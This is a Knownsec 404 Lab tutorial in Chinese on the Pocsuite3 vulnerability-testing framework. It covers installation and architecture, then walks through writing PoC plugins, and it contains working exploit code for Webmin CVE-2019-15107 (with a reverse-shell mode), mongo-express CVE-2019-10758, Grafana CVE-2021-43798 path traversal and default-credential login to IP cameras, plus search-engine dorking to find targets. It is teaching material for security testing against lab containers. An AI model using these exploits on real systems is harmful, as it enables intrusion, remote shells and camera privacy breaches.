**作者：知道创宇404实验室**  
 **时间：2022年7月13日**

# 1 简介

[Pocsuite3](https://pocsuite.org/ "Pocsuite3")是由知道创宇 404 实验室打造的一款基于 GPLv2
许可证开源的远程漏洞测试框架，自 2015 年开源以来，知道创宇安全研究团队持续维护至今，不断更新迭代。

一些特性：

  * 支持 verify、attack、shell 三种模式，不仅为扫描而生，也可用于其他场景，比如漏洞 exploit、获取目标的交互式 shell

  * 集成了 ZoomEye、Shodan 等常见网络空间搜索引擎，方便资产导入

  * CEye、Interactsh 等 DNSLog 工具集成，辅助无回显漏洞验证

  * 插件系统，用户可自定义 TARGETS、POCS、RESULTS 类型插件，可拓展性强

  * 网络库（urllib3、requests）的 hook，方便 PoC 编写及全局控制

  * 支持 IPv4/IPv6

  * 全局 HTTP/HTTPS/SOCKS 代理支持

  * 集成调用支持，可以当成一个模块使用

  * 业界良心，代码全开源

  * ...

和 Metasploit 相比，Pocsuite3 目前不具有后渗透阶段的能力，比较轻量级。而相比于 YAML 格式的 PoC 框架，Pocsuite3
更加灵活，可以直接使用大量的第三方库，用户只要会写 Python，就能快速上手。当然灵活也带来了 PoC
维护的问题，毕竟大家的编码风格各异，只能说有利有弊吧。

目前 Pocsuite3 对于 YAML 格式 PoC 的支持也在计划之中， 敬请期待。

# 2 安装

Pocsuite3 基于 Python3 开发，可以运行在支持 Python 3.7+ 的任何平台上，例如 Linux、Windows、MacOS、BSD
等。

2021 年 11月，Pocsuite3 通过了 Debian 官方的代码及合规检查，[正式加入 Debian、Ubuntu、Kali 等 Linux
发行版的软件仓库](https://mp.weixin.qq.com/s/0lPA8FGKA64X8K-aTcgmMQ "正式加入
Debian、Ubuntu、Kali 等 Linux 发行版的软件仓库")，可以通过 apt 命令一键获取。此外，Pocsuite3 也已经推送到
Python PyPi、MacOS 的 Homebrew 仓库、Archlinux 的 Aur 仓库、Dockerhub。

## 2.1 使用 Python3 pip 安装

    
    
    pip3 install pocsuite3
    
    # 使用国内镜像加速
    pip3 install -i https://pypi.tuna.tsinghua.edu.cn/simple pocsuite3
    

![image](https://image.3001.net/images/20220714/1657779726_62cfb60e0891e2c5296a4.png!small)

## 2.2 在 MacOS 上安装

    
    
    brew update
    brew info pocsuite3
    brew install pocsuite3
    

![image](https://image.3001.net/images/20220714/1657779756_62cfb62cbe80864d5318a.png!small)

## 2.3 [Debian](https://tracker.debian.org/pkg/pocsuite3),
[Ubuntu](https://launchpad.net/ubuntu/+source/pocsuite3),
[Kali](http://pkg.kali.org/pkg/pocsuite3)

    
    
    sudo apt update
    sudo apt install pocsuite3
    

![image](https://image.3001.net/images/20220714/1657779787_62cfb64b3e099b9f5c563.png!small)

## 2.4 Docker

    
    
    docker run -it pocsuite3/pocsuite3
    

![image](https://image.3001.net/images/20220714/1657779807_62cfb65fb468e17237384.png!small)

## 2.5 Arch Linux

    
    
    yay pocsuite3
    

![image](https://image.3001.net/images/20220714/1657779825_62cfb671701b7d4d162bb.png!small)

## 2.6 源码安装

    
    
    wget https://github.com/knownsec/pocsuite3/archive/master.zip
    unzip master.zip
    cd pocsuite3-master
    pip3 install -r requirements.txt
    python3 setup.py install
    

# 3 架构简析

为了使用的更加丝滑，有必要了解下框架的架构。整体而言，本框架主要包含四个部分，分别是目标收集、PoC 插件加载、多线程检测、结果汇总。如下图所示：

![image](https://image.3001.net/images/20220714/1657779838_62cfb67ec3e7dc14629bd.png!small)

## 3.1 目标收集

首先来看一下目标收集，目前支持以下方式：

  * `-u`指定单个 URL 或者 CIDR，支持 IPv4 / IPv6。使用`-p`参数可以提供额外的端口，配合 CIDR 可以很方便的探测一个目标网段

  * `-f`指定一个文件，将多个 URL/CIDR 存到文件中，每行一个

  * `--dork`，框架集成了 ZoomEye、Shodan 等常见网络空间搜索引擎，只需要使用相应的参数提供搜索关键词和`API-KEY`即可自动导入目标。值得一提的是，用户也可以将搜索关键词放到 PoC 插件的 dork 属性中

  * `--plugins`调用插件加载目标，比如`target_from_redis`。用户也可以自定义 TARGETS 类型插件

## 3.2 PoC 插件加载

  * `-r`选项支持指定一个或多个 PoC 路径（或目录），如果提供的是目录，框架将遍历目录然后加载所有符合条件的 PoC，用户可以用`-k`选项指定关键词对 PoC 进行筛选，如组件名称、CVE编号等。如果我们确认了目标组件，就可以用`-k`选项找到所以对应的 PoC 对目标进行批量测试。如果只提供了`-k`选项，`-r`默认为 Pocsuite3 自带的`pocsuite3/pocs`目录

  * `--plugins`调用插件加载 PoC，比如`poc_from_seebug`、`poc_from_redis`。用户也可以自定义 POCS 类型插件

## 3.3 多线程检测

当用户指定了目标和 PoC 后，框架会将每个目标和 PoC 进行匹配（笛卡尔积），生成一个元素为`(target,
poc_module)`的队列，然后起一个默认大小为 150（可通过`--threads`设置） 的线程池处理这个队列。

在 Pocsuite3 中，PoC 插件有三种运行模式，分别对应 PoC
插件中定义的三种方法，可使用命令行参数`--verify`、`--attack`、`--shell`决定执行哪种方法，如果不指定，默认是`--verify`。

线程要做的就是以 target 为参数初始化 PoC 插件并执行指定方法，然后获取执行结果。

## 3.4 结果汇总

上一步获取了执行结果后，框架提供了多种方法对结果进行处理并保存：

  * 控制台日志，`-v`参数控制日志级别，`--ppt`参数可以对 IP 地址马赛克处理，方便录屏

  * `-o`参数将运行结果保存为 JSON Lines 格式的文件

  * `--plugins`调用插件对结果进行处理，比如：`file_record`，`html_report`。用户也可以自定义 RESULTS 类型插件

# 4 运行

Pocsuite3 有三种运行方法，1、命令行；2、交互式控制台；3、集成调用。

## 4.1 命令行

直接运行 pocsuite 命令，并使用对应参数指定待测试的目标和 PoC。

![image](https://image.3001.net/images/20220714/1657779985_62cfb7116706ce8606702.png!small)

## 4.2 交互式控制台

类似 Metasploit 的控制台，使用`poc-console`命令进入。

![image](https://image.3001.net/images/20220714/1657780000_62cfb72041f331eeebc58.png!small)

## 4.3 集成调用

当成一个模块来使用。

![image](https://image.3001.net/images/20220714/1657780010_62cfb72acd2bf42789a4d.png!small)

# 5 如何编写 PoC

框架只是躯壳，PoC 才是灵魂。这里以几种常见的漏洞类型为例，说明如何基于 Pocsuite3 框架快速开发 PoC。（
**以下漏洞皆为网上的公开漏洞，该教程仅用于工具教学目的，禁止将 PoC 用于任何非法用途！** ）

Pocsuite3 可以通过`-n`或`--new`参数自动生成 PoC 模版。

## 5.1 PoC 插件的三种模式

1、verify 模式，验证漏洞存在。验证方式取决于具体的漏洞类型，比如检查目标的软件版本、判断某个关键 API
的状态码或返回、读取特定文件、执行一个命令并获取结果，结合 DNSLog 带外回显等。该模式用于批量漏洞排查，一般不需要用户提供额外参数
，且应尽可能对目标无害。

2、attack 模式，攻击模式，可实现某种特定需求。比如获取特定数据、写入一句话并返回 shell
地址、从命令行参数获取命令并执行、从命令行参数获取文件路径并返回文件内容等。

3、shell 模式，获取交互式 shell，此模式下会默认监听本机的 6666
端口（可通过`--lhost`、`--lport`参数修改），编写对应的代码，让目标执行反连 Payload 反向连接到设定的 IP 和端口即可得到一个
shell。反连 Payload 可参考：[GTFOBins Reverse
shell](https://gtfobins.github.io/#+reverse%20shell)。

在 PoC 插件中，attack 模式和 shell 模式的实现是可选的。

## 5.2 PoC 插件基类

为了简化 PoC 插件的编写，Pocsuite3 实现了 PoC 基类：`POCBase`，很多共用的代码片段都可以放到此基类中。我们编写 PoC
时，只需要继承该基类就可，比较常用的属性和方法如下：

    
    
    常用属性：
    
    self.url  # 目标 url
    self.scheme  # 目标 url 的协议
    self.rhost  # 目标 url 的主机名
    self.rport  # 目标 url 的端口
    self.host_ip  # 本机的 wan 口 ip
    
    常用方法：
    
    self._check()  # 端口开放检查、http/https 协议自动纠正、dork 检查、蜜罐检查
    self.get_option('key')  # 获取命令行参数 --key 的值
    self.parse_output({})  # 返回结果的方法，参数是一个字典
    
    

## 5.3 Webmin 未授权远程命令执行漏洞（CVE-2019-15107）

漏洞细节：[Webmin Unauthenticated Remote
Execution](https://www.seebug.org/vuldb/ssvid-98060)

Webmin 是功能强大的基于 Web 的 Unix 系统管理工具，管理员可以通过浏览器访问 Webmin
的各种管理功能并完成相应的管理动作。`Webmin <= 1.920`版本的`/password_change.cgi`接口存在一处未授权命令注入漏洞。

基于网上公开的漏洞细节，我们可以很容易的开发出该漏洞的 PoC 插件。首先使用`--new`参数生成 PoC 模版（如果嫌属性比较多，一路回车即可）：

    
    
    →pocsuite --new
    ...
    You are about to be asked to enter information that will be used to create a poc template.
    There are quite a few fields but you can leave some blank.
    For some fields there will be a default value.
    -----    Seebug ssvid (eg, 99335) [0]: 98060  # Seebug 漏洞收录ID，如果没有则为0
    PoC author (eg, Seebug) []: Seebug  # PoC 的作者
    Vulnerability disclosure date (eg, 2021-8-18) [2022-07-11]: 2019-08-19  # 漏洞公开日期
    Advisory URL (eg, https://www.seebug.org/vuldb/ssvid-99335) [https://www.seebug.org/vuldb/ssvid-98060]:  # 漏洞来源地址
    Vulnerability CVE number (eg, CVE-2021-22123) []: CVE-2019-15107  # CVE 编号
    Vendor name (eg, Fortinet) []:  # 厂商名称
    Product or component name (eg, FortiWeb) []: Webmin  # 漏洞应用名称
    Affected version (eg, <=6.4.0) []: <=1.920  # 漏洞影响版本
    Vendor homepage (eg, https://www.fortinet.com) []: https://www.webmin.com  # 厂商官网
    
    0    Arbitrary File Read
    1    Code Execution
    2    Command Execution
    3    Denial Of service
    4    Information Disclosure
    5    Login Bypass
    6    Path Traversal
    7    SQL Injection
    8    SSRF
    9    XSS
    
    Vulnerability type, choose from above or provide (eg, 3) []: 2  # 选择漏洞类型
    Authentication Required (eg, yes) [no]: no  # 漏洞是否需要认证
    Can we get result of command (eg, yes) [no]: yes  # 是否可以获取命令执行结果
    PoC name [Webmin <=1.920 Pre-Auth Command Execution (CVE-2019-15107)]:  # PoC 名称
    Filepath in which to save the poc [./webmin_1.920_pre-auth_command_execution_cve-2019-15107.py]  # 保存 PoC 的文件路径
    [14:50:49] [INFO] Your poc has been saved in ./webmin_1.920_pre-auth_command_execution_cve-2019-15107.py :)
    
    

生成的 PoC 模版如下：

    
    
    #!/usr/bin/env python3
    # -*- coding: utf-8 -*-    
    # 建议统一从 pocsuite3.api 导入
    from pocsuite3.api import (
        minimum_version_required, POCBase, register_poc, requests, logger,
        OptString, OrderedDict,
        random_str,
        get_listener_ip, get_listener_port, REVERSE_PAYLOAD
    )
    
    # 限定框架版本，避免在老的框架上运行新的 PoC 插件
    minimum_version_required('1.9.6')
    
    
    # DemoPOC 类，继承自基类 POCBase
    class DemoPOC(POCBase):
        # PoC 和漏洞的属性信息
        vulID = '98060'
        version = '1'
        author = 'Seebug'
        vulDate = '2019-08-19'
        createDate = '2022-07-11'
        updateDate = '2022-07-11'
        references = ['https://www.seebug.org/vuldb/ssvid-98060']
        name = 'Webmin <=1.920 Pre-Auth Command Execution (CVE-2019-15107)'
        appPowerLink = 'https://www.webmin.com'
        appName = 'Webmin'
        appVersion = '<=1.920'
        vulType = 'Command Execution'
        desc = 'Vulnerability description'
        samples = ['']  # 测试样列，就是用 PoC 测试成功的目标
        install_requires = ['']  # PoC 第三方模块依赖
        pocDesc = 'User manual of poc'
        # 搜索 dork，如果运行 PoC 时不提供目标且该字段不为空，将会调用插件从搜索引擎获取目标。
        dork = {'zoomeye': ''}
        suricata_request = ''
        suricata_response = ''
    
        # 定义额外的命令行参数，用于 attack 模式
        def _options(self):
            o = OrderedDict()
            o['cmd'] = OptString('uname -a', description='The command to execute')
            return o
    
        # 漏洞的核心方法
        def _exploit(self, param=''):
            # 使用 self._check() 方法检查目标是否存活，是否是关键词蜜罐。
            if not self._check(dork=''):
                return False
    
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            payload = 'a=b'
            res = requests.post(self.url, headers=headers, data=payload)
            logger.debug(res.text)
            return res.text
    
        # verify 模式的实现
        def _verify(self):
            result = {}
            flag = random_str(6)
            param = f'echo {flag}'
            res = self._exploit(param)
            if res and flag in res:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo'][param] = res
            # 统一调用 self.parse_output() 返回结果
            return self.parse_output(result)
    
        # attack 模式的实现
        def _attack(self):
            result = {}
            # self.get_option() 方法可以获取自定义的命令行参数
            param = self.get_option('cmd')
            res = self._exploit(param)
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo'][param] = res
            # 统一调用 self.parse_output() 返回结果
            return self.parse_output(result)
    
        # shell 模式的实现
        def _shell(self):
            try:
                self._exploit(REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port()))
            except Exception:
                pass
    
    
    # 将该 PoC 注册到框架。
    register_poc(DemoPOC)
    
    

在以上 PoC 模版的基础上，结合漏洞细节，重写`_exploit()`方法，如下：

    
    
    def _exploit(self, param=''):
        if not self._check(dork='<title>Login to Webmin</title>'):
            return False
    
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': f'{self.url}/session_login.cgi'
        }
        payload = f'user=rootxx&pam=&expired=2&old=test|{param}&new1=test2&new2=test2'
        res = requests.post(f'{self.url}/password_change.cgi', headers=headers, data=payload)
        logger.debug(res.text)
        return res.text.split('The current password is incorrect')[-1].split('</h3></center>')[0]
    
    

然后就是搭建 docker 靶场测试了，`docker run -it --rm -p 10000:10000
pocsuite3/cve-2019-15107`。

verify 模式 ok：

![image](https://image.3001.net/images/20220714/1657780035_62cfb743d5906453f6321.png!small)

attack 模式获取命令行参数执行并返回结果，`--options`参数可以查看 PoC 定义的额外命令行参数：

![image](https://image.3001.net/images/20220714/1657780048_62cfb7500681e041912a3.png!small)

shell 模式用 bash 的反连回不来，未深究，改用 python 的就可以了。需要注意的是，由于反连 payload
存在一些特殊字符，需要结合漏洞具体情况具体分析，比如使用 base64 编码等绕过限制。

    
    
    def _shell(self):
             try:
    -            self._exploit(REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port()))
    +            self._exploit(REVERSE_PAYLOAD.PYTHON.format(get_listener_ip(), get_listener_port()))
             except Exception:
                 pass
    

shell 模式 ok：

![image](https://image.3001.net/images/20220714/1657780062_62cfb75e79c1738b8ebb9.png!small)

## 5.4 mongo-express 认证远程代码执行漏洞（CVE-2019-10758）

漏洞细节：[mongo-express远程代码执行漏洞（CVE-2019-10758）](https://www.seebug.org/vuldb/ssvid-98116)

Mongo-express 是一个基于 Node.js 和 express 的开源的 MongoDB Web 管理界面。`mongo-express <=
0.53.0`版本存在认证远程代码执行漏洞。如果攻击者可以成功登录，或者目标服务器没有修改默认的账号密码（`admin:pass`），则可以执行任意
node.js 代码。

使用`pocsuite --new`生成模版，由于该漏洞没有回显，我们使用 [CEye](http://www.ceye.io)或者
[Interactsh](https://github.com/projectdiscovery/interactsh)等 DNSLog 服务来辅助验证。

[Interactsh](https://github.com/projectdiscovery/interactsh)是知名开源软件组织
projectdiscovery 开发的一款 DNSLog 工具，只要有一个域名，就可以快速搭建属于自己的 oob
服务。网上也有一些公开可用的，如：`interact.sh, oast.pro, oast.live, oast.site, oast.online,
oast.fun, oast.me`。

生成模版：

    
    
    →pocsuite --new
    ...
    -----    Seebug ssvid (eg, 99335) [0]: 98116
    PoC author (eg, Seebug) []: Seebug
    Vulnerability disclosure date (eg, 2021-8-18) [2022-7-11]: 2020-01-03
    Advisory URL (eg, https://www.seebug.org/vuldb/ssvid-99335) [https://www.seebug.org/vuldb/ssvid-98116]:
    Vulnerability CVE number (eg, CVE-2021-22123) []: CVE-2019-10758
    Vendor name (eg, Fortinet) []:
    Product or component name (eg, FortiWeb) []: mongo-express
    Affected version (eg, <=6.4.0) []: <=0.53.0
    Vendor homepage (eg, https://www.fortinet.com) []: https://github.com/mongo-express/mongo-express
    
    0    Arbitrary File Read
    1    Code Execution
    2    Command Execution
    3    Denial Of service
    4    Information Disclosure
    5    Login Bypass
    6    Path Traversal
    7    SQL Injection
    8    SSRF
    9    XSS
    
    Vulnerability type, choose from above or provide (eg, 3) []: 1
    Authentication Required (eg, yes) [no]: yes  # 漏洞需要认证
    Can we get result of command (eg, yes) [no]: no  # 漏洞无回显
    Out-of-band server to use (eg, interactsh) [ceye]: interactsh  # 选择使用哪个 oob 服务
    ...
    
    

根据漏洞细节，对模版进行简单修改：

    
    
    def _options(self):
             o = OrderedDict()
    -        o['user'] = OptString('', description='The username to authenticate as', require=True)
    -        o['pwd'] = OptString('', description='The password for the username', require=True)
    +        o['user'] = OptString('admin', description='The username to authenticate as', require=True)
    +        o['pwd'] = OptString('pass', description='The password for the username', require=True)
             o['cmd'] = OptString('uname -a', description='The command to execute')
             return o
    
         def _exploit(self, param=''):
    -        if not self._check(dork=''):
    +        if not self._check(dork='mongo-express='):
                 return False
    
             user = self.get_option('user')
             pwd = self.get_option('pwd')
             headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    -        payload = 'a=b'
    -        res = requests.post(self.url, headers=headers, data=payload)
    +        payload = (
    +            'document=this.constructor.constructor("return process")().'
    +            f'mainModule.require("child_process").execSync("{param}")'
    +        )
    +        res = requests.post(f'{self.url}/checkValid', headers=headers, data=payload, auth=(user, pwd))
             logger.debug(res.text)
             return res.text
    

搭建靶场：<https://github.com/vulhub/vulhub/tree/master/mongo-express/CVE-2019-10758>

漏洞验证，通过命令行参数`--user admin --pwd pass --oob-server interact.sh`分别指定了用户名、密码、和使用的
DNSLog 服务地址，也可以不指定，使用默认值。  
![image](https://image.3001.net/images/20220714/1657780131_62cfb7a3c064efb7012ad.png!small)

## 5.5 Grafana 未授权任意文件读取漏洞（CVE-2021-43798）

漏洞细节：[Grafana
文件读取漏洞分析与汇总(CVE-2021-43798)](https://blog.riskivy.com/grafana-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E6%B1%87%E6%80%BBcve-2021-43798/)

Grafana 是一个跨平台、开源的数据可视化网络应用程序平台。`Grafana v8.0.0-beta1`到`v8.3.0`存在未授权任意文件读取漏洞。

生成模版：

    
    
    →pocsuite --new
    ...
    -----    Seebug ssvid (eg, 99335) [0]: 99398
    PoC author (eg, Seebug) []: Seebug
    Vulnerability disclosure date (eg, 2021-8-18) [2022-07-11]: 2021-12-07
    Advisory URL (eg, https://www.seebug.org/vuldb/ssvid-99335) [https://www.seebug.org/vuldb/ssvid-99398]:
    Vulnerability CVE number (eg, CVE-2021-22123) []: CVE-2021-43798
    Vendor name (eg, Fortinet) []:
    Product or component name (eg, FortiWeb) []: Grafana
    Affected version (eg, <=6.4.0) []: <=8.3.0
    Vendor homepage (eg, https://www.fortinet.com) []: https://grafana.com
    
    0    Arbitrary File Read
    1    Code Execution
    2    Command Execution
    3    Denial Of service
    4    Information Disclosure
    5    Login Bypass
    6    Path Traversal
    7    SQL Injection
    8    SSRF
    9    XSS
    
    Vulnerability type, choose from above or provide (eg, 3) []: 0
    Authentication Required (eg, yes) [no]: no
    ...
    

根据公开的漏洞细节，修改`_exploit`方法：

    
    
    def _exploit(self, param=''):
    -        if not self._check(dork=''):
    +        if not self._check(dork='Grafana', allow_redirects=True):
                 return False
    
    -        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    -        payload = 'a=b'
    -        res = requests.post(self.url, headers=headers, data=payload)
    +        res = requests.get(f'{self.url}/public/plugins/grafana/../../../../../../../..{param}')
             logger.debug(res.text)
             return res.text
    

搭建靶场：`docker run -it --rm -p 3000:3000 pocsuite3/cve-2021-43798`

verify 模式效果：

![image](https://image.3001.net/images/20220714/1657780151_62cfb7b74a8efb2c1fd7f.png!small)

追加`-o a.json`参数可以把结果保存为 JSON Lines 格式的文件。

![image](https://image.3001.net/images/20220714/1657780161_62cfb7c12ef12f3681934.png!small)

attack 模式，从命令行获取文件路径并返回结果。

![image](https://image.3001.net/images/20220714/1657780171_62cfb7cb6908614d9cb9e.png!small)

针对目录穿越漏洞，有个比较坑的点是`urlib3>1.24.3`版本会从请求 URL 中删除`../`，这影响了很多安全工具，具体可见
issue：<https://github.com/urllib3/urllib3/issues/1790>

Pocsuite3 hook 了 urllib3 和 requests 的部分代码，支持`../`，同时取消了对特殊字符的编码。

![image](https://image.3001.net/images/20220714/1657780186_62cfb7dae3673b4e8c663.png!small)

## 5.6 某网络摄像头登录绕过漏洞

漏洞细节：[某网络摄像头登录绕过及多个基于堆栈溢出的远程代码执行漏洞及数据分析报告](https://paper.seebug.org/653/)

该品牌摄像头的 Web 服务基于 HTTP
基本认证，存在三组默认凭证，分别对应不同的权限等级。三组默认凭证分别为：`admin:admin`，`user:user`，`guest:guest`，安装时
APP 只会提醒修改 admin 账户的默认密码。

值得一提的是，user 账户和 guest 账户也可以查看视频流，大部分用户不会修改这些账户的默认密码，导致隐私泄漏。

生成模版：

    
    
    →pocsuite --new
    ...
    0    Arbitrary File Read
    1    Code Execution
    2    Command Execution
    3    Denial Of service
    4    Information Disclosure
    5    Login Bypass
    6    Path Traversal
    7    SQL Injection
    8    SSRF
    9    XSS
    
    Vulnerability type, choose from above or provide (eg, 3) []: 5
    ...
    

修改模版：

    
    
    -    def _options(self):
    -        o = OrderedDict()
    -        o['param'] = OptString('', description='The param')
    -        return o
    -         def _exploit(self, param=''):
    -        if not self._check(dork=''):
    +        if not self._check(dork='Error: username or password error,please input again.'):
                 return False
    
    -        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    -        payload = 'a=b'
    -        res = requests.post(self.url, headers=headers, data=payload)
    -        logger.debug(res.text)
    -        return res.text
    +        creds = {'admin': 'admin', 'user': 'user', 'guest': 'guest'}
    +        valid_creds = {}
    +        for u, p in creds.items():
    +            res = requests.get(self.url, auth=(u, p))
    +            if res.status_code != 401:
    +                valid_creds[u] = p
    +        return valid_creds
    
         def _verify(self):
             result = {}
    @@ -53,17 +48,11 @@ class DemoPOC(POCBase):
             if res:
                 result['VerifyInfo'] = {}
                 result['VerifyInfo']['URL'] = self.url
    -            result['VerifyInfo'][param] = res
    +            result['VerifyInfo']['Info'] = res
             return self.parse_output(result)
    
         def _attack(self):
    -        result = {}
    -        param = self.get_option('param')
    -        res = self._exploit(param)
    -        result['VerifyInfo'] = {}
    -        result['VerifyInfo']['URL'] = self.url
    -        result['VerifyInfo'][param] = res
    -        return self.parse_output(result)
    +        return self._verify()
    
    

使用`--dork-zoomeye`指定关键词从 ZoomEye 检索目标进行检测。  
![image](https://image.3001.net/images/20220714/1657780202_62cfb7eab8e17775750f1.png!small)

# 6 最后

如果在使用过程中遇到任何问题，或者有啥新想法，欢迎提交 issue
(<https://github.com/knownsec/pocsuite3/issues/new>) 或者 PR
(<https://github.com/knownsec/pocsuite3/compare>)

附Pocsuite3演示视频：<https://weibo.com/u/2346192380?tabtype=newVideo>

